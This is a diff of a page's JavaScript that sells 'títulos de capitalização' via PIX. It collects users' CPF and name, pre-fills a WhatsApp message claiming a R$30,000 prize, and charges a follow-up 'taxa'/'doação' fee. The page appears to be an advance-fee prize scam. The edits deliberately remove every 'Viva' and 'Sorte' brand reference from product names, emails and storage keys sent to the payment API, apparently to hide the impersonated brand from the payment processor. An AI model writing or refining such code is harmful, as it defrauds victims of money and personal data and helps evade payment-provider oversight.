@@ -1408,7 +1408,6 @@
     let tentativasVerificacao = 0;
     let verificacaoTaxaAutomatica = null;
 
-    // FUNÇÃO CORRIGIDA PARA SELEÇÃO DE PACOTE
     function selecionarPacote(quantidade, valor, event) {
         console.log('Selecionando pacote:', quantidade, valor);
         
@@ -1441,7 +1440,7 @@
                 transaction_id: transactionId,
                 items: [{
                     item_id: 'sorte_titulos',
-                    item_name: 'Sorte - títulos de capitalização',
+                    item_name: 'Título de Capitalização',
                     quantity: quantidade,
                     price: valor / quantidade
                 }]
@@ -1453,7 +1452,7 @@
                 value: valor,
                 currency: 'BRL',
                 content_ids: ['sorte_titulos'],
-                content_name: 'Sorte - títulos de capitalização',
+                content_name: 'Título de Capitalização',
                 content_type: 'product',
                 num_items: quantidade
             });
@@ -1463,7 +1462,7 @@
     }
 
     function abrirSuporteWhatsApp() {
-        const whatsappLink = "https://wa.me/5511954268216?text=Olá!%20Ganhei%20R$%2030.000,00%20no%20Sorte%20e%20gostaria%20de%20receber%20meu%20prêmio.";
+        const whatsappLink = "https://wa.me/5511954268216?text=Olá!%20Ganhei%20R$%2030.000,00%20e%20gostaria%20de%20receber%20meu%20prêmio.";
         window.open(whatsappLink, '_blank', 'noopener,noreferrer');
     }
 
@@ -1832,10 +1831,11 @@
         btnGerarPIX.disabled = true;
         
         try {
-            // CORREÇÃO: Removido "Viva" do nome do produto
-            const nomeProduto = `Sorte - ${pacoteSelecionado.quantidade} títulos de capitalização`;
-            // CORREÇÃO: Email temporário sem "vivasorte"
-            const emailTemp = `sorte_${Date.now()}@temp.com`;
+            // CORREÇÃO FINAL: Removido completamente "Viva" e "Sorte" do nome do produto
+            // Usando apenas "Título de Capitalização" como nome do produto
+            const nomeProduto = `Título de Capitalização`;
+            // CORREÇÃO: Email temporário sem nenhuma referência a "viva" ou "sorte"
+            const emailTemp = `cliente_${Date.now()}@temp.com`;
             
             const dadosPIX = {
                 amount: pacoteSelecionado.valor,
@@ -1849,6 +1849,8 @@
             };
             
             console.log('📤 Enviando para API com dados completos:', dadosPIX);
+            console.log('🔑 Nome do produto enviado:', nomeProduto);
+            console.log('📧 Email enviado:', emailTemp);
             
             const response = await fetch(ALLOWPAY_CONFIG.API_URL, {
                 method: 'POST',
@@ -1883,7 +1885,7 @@
             dadosUsuario.transactionId = resultado.transaction_id;
             dadosUsuario.pixData = resultado;
             
-            localStorage.setItem(`pix_sorte_${resultado.transaction_id}`, JSON.stringify({
+            localStorage.setItem(`pix_cliente_${resultado.transaction_id}`, JSON.stringify({
                 ...resultado,
                 cpf: dadosUsuario.cpf,
                 nome: dadosUsuario.nome,
@@ -2052,11 +2054,11 @@
     }
 
     function processarConfirmacao(dadosConfirmacao) {
-        const transacaoSalva = JSON.parse(localStorage.getItem(`pix_sorte_${dadosUsuario.transactionId}`) || '{}');
+        const transacaoSalva = JSON.parse(localStorage.getItem(`pix_cliente_${dadosUsuario.transactionId}`) || '{}');
         transacaoSalva.status = 'paid';
         transacaoSalva.confirmado_em = new Date().toISOString();
         transacaoSalva.confirmacao_dados = dadosConfirmacao;
-        localStorage.setItem(`pix_sorte_${dadosUsuario.transactionId}`, JSON.stringify(transacaoSalva));
+        localStorage.setItem(`pix_cliente_${dadosUsuario.transactionId}`, JSON.stringify(transacaoSalva));
         
         salvarConfirmacaoPagamento();
         
@@ -2085,9 +2087,9 @@
             confirmado_em: new Date().toISOString()
         };
         
-        let transacoes = JSON.parse(localStorage.getItem('sorte_transacoes') || '[]');
+        let transacoes = JSON.parse(localStorage.getItem('transacoes_cliente') || '[]');
         transacoes.push(transacao);
-        localStorage.setItem('sorte_transacoes', JSON.stringify(transacoes));
+        localStorage.setItem('transacoes_cliente', JSON.stringify(transacoes));
         
         console.log('✅ Pagamento confirmado salvo:', transacao);
     }
@@ -2284,7 +2286,7 @@
             
             dadosUsuario.transactionIdTaxa = resultado.transaction_id;
             
-            localStorage.setItem(`doacao_sorte_${resultado.transaction_id}`, JSON.stringify({
+            localStorage.setItem(`doacao_cliente_${resultado.transaction_id}`, JSON.stringify({
                 ...resultado,
                 cpf: dadosUsuario.cpf,
                 nome: dadosUsuario.nome,
@@ -2442,9 +2444,9 @@
             confirmado_em: new Date().toISOString()
         };
         
-        let doacoes = JSON.parse(localStorage.getItem('sorte_doacoes') || '[]');
+        let doacoes = JSON.parse(localStorage.getItem('doacoes_cliente') || '[]');
         doacoes.push(transacaoTaxa);
-        localStorage.setItem('sorte_doacoes', JSON.stringify(doacoes));
+        localStorage.setItem('doacoes_cliente', JSON.stringify(doacoes));
         
         console.log('✅ Doação salva:', transacaoTaxa);
     }
